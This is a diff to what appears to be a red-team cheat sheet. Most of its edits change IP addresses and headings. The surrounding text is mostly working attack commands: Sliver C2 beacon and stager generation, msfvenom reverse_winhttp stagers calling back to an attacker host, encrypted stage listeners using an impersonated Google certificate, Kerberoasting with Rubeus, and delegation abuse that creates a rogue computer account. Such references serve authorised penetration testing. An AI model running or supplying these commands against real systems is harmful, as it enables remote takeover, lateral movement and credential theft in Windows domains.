@@ -2691,7 +2691,7 @@ generate beacon --evasion --arch amd64 --mtls [ip:port] --format [exe,shellcode,
 Generate Sessions:
 ```
 # DLL Entrypoint (StartW)
-generate --mtls 192.168.124.1:443 --format shared
+generate --mtls 192.168.1.1:443 --format shared
 ```
 
 Convert to Shellcode to PowerShell Payload (Unstable):
@@ -2703,29 +2703,30 @@ msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --plat
 Metasploit
 ```
 # Generate Profile
-new beacon --mtls 192.168.1.1:443 --format shellcode shellcode-beacon
+new beacon --mtls 192.168.1.1:443 --format shellcode win-shellcode
 
 # Setup Stager Listener
 stage-listener --url http://192.168.1.1:1234 --profile win-shellcode --prepend-size
 
 # Generate Stager (Format can be anything)
-msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.122.1 LPORT=1234 LURI=/hello.woff -f raw -o /tmp/stager.bin
+msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.1.1 LPORT=1234 LURI=/hello.woff -f raw -o /tmp/stager.bin
 ```
 Sliver
-```
-[Unencrypted]
 
+Unencrypted
+```
 # Generate Profile
 profiles new beacon --mtls 192.168.1.1:443 --format shellcode shellcode-beacon
 
 # Generate Stager Listener
-stage-listener -u tcp://192.168.56.1:8080 -p shellcode-beacon
+stage-listener -u tcp://192.168.1.1:8080 -p shellcode-beacon
 
 # Generate Stager
 generate stager -f c -L 192.168.1.1 -l 8080
+```
 
-[Encrypted]
-
+Encrypted
+```
 # Generate SSL Cert
 msf > use auxiliary/gather/impersonate_ssl 
 msf auxiliary(impersonate_ssl) > set RHOST www.google.com
@@ -2743,10 +2744,10 @@ msf auxiliary(impersonate_ssl) > run
 [*] Auxiliary module execution completed
 
 # Setup Beacon Listener
-https -L 192.168.1.11 -l 443 -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key
+https -L 192.168.1.1 -l 443 -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key
 
 # Setup Stager Listener
-stage-listener --url https://192.168.1.11:8080 --profile local -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
+stage-listener --url https://192.168.1.1:8080 --profile local -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
 
 # Generate Stager
 generate stager -f csharp -L 192.168.1.1 -l 8080
@@ -2908,7 +2909,7 @@ rubeus kerberoast /nowrap
 https://github.com/wavvs/nanorobeus
 ```
 
-### Delegations
+### Delegation Abuse
 
 Constrained
 ```
@@ -2933,6 +2934,7 @@ ls //HOST/C$
 # May need to remove the FQDN from the msdsspn attribute.
 ```
 
+Resource-Based Constrained Delegation (RBCD)
 ```
 # Create Computer Acc (If No Access to Computer Acc Already)
 execute-assembly ~/www/windows/StandIn.exe --computer EvilComputer --make
